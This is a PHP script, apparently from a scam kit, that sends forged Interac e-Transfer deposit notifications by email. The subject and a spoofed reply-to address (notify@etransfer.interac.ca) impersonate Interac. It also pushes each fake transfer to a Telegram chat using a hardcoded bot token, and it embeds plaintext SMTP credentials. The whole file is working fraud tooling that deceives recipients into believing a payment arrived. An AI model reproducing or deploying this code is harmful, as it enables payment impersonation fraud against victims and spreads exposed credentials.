<?php

$telegramBotToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s";
$chatId = "-1001819831566"; // Chat ID where you want to send the notification
$message = "The transfer sent to". $_POST["recipient-name"]." for $".$_POST["amount"]." has been successfully deposited. .";

$telegramApiEndpoint = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
$telegramApiParams = [
    "chat_id" => $chatId,
    "text" => $message
];

// Send the notification to Telegram bot using cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiEndpoint);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramApiParams);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$result = curl_exec($ch);
curl_close($ch);

// Check the result (you might want to handle errors more gracefully)
if ($result) {
    // Notification sent successfully
    echo "Notification sent successfully.";
} else {
    // Notification sending failed
    echo "Notification sending failed.";
}

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require("phpmailer/src/PHPMailer.php");
require("phpmailer/src/SMTP.php");
require("phpmailer/src/Exception.php");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    try {
        // Retrieve form data from POST
        $accountType = $_POST["account-type"];
        $recipientName = $_POST["recipient-name"];
        $recipientEmail = $_POST["recipient-email"];
        $amount = $_POST["amount"];
        $transferDate = $_POST["transfer-date"];
        $memo = $_POST["memo"];

        // Create placeholders array for replacement in the email template
        $placeholders = array(
            '{{account_type}}' => $accountType,
            '{{recipient_name}}' => $recipientName,
            '{{recipient_email}}' => $recipientEmail,
            '{{amount}}' => $amount,
            '{{transfer_date}}' => $transferDate,
            '{{memo}}' => $memo,
        );

        $message = file_get_contents('template1.html'); // Load the email template
        $message = str_replace(array_keys($placeholders), array_values($placeholders), $message);

        $mail = new PHPMailer(true); // Create a new PHPMailer instance with exceptions enabled
        $mail->IsSMTP();
        $mail->SMTPSecure = 'tls';
        $mail->Host = 'mail.mymts.net'; // Use the provided host
        $mail->Port = 587; // The common SMTP port for TLS
        $mail->Body = $message;
        $mail->SMTPAuth = true;
        $mail->Username = 'andallard@mymts.net'; // Use the email address as the username
        $mail->Password = 'Batman123'; // Use the provided password
        $mail->SetFrom('andallard@mymts.net', 'KYLE HODGENSON'); // Set From name to "Canada Post"
        $mail->AddAddress($recipientEmail);
        $mail->Subject = 'INTERAC e-Transfer: A money transfer from KYLE HODGENSON has been automatically deposited.';
        $mail->IsHTML(true);
        $mail->CharSet = "utf-8";
        $mail->addReplyTo('notify@etransfer.interac.ca', 'Interac e-Transfer');

        if ($mail->send()) {
            header("Location: complete.php");
            exit; // Make sure to exit to prevent further script execution
                
        } else {
            // Email sending failed
            echo "Email sending failed<br>";
            echo "Error: " . $mail->ErrorInfo . "<br>"; // Display the detailed error message
        }
    } catch (Exception $e) {
        // Handle exceptions, log errors, or display error messages
        echo "Message could not be sent. Mailer Error: " . $e->getMessage() . "<br>";
    }
} else {
    // Handle the case where the form was not submitted
    echo "Form not submitted<br>";
}
?>
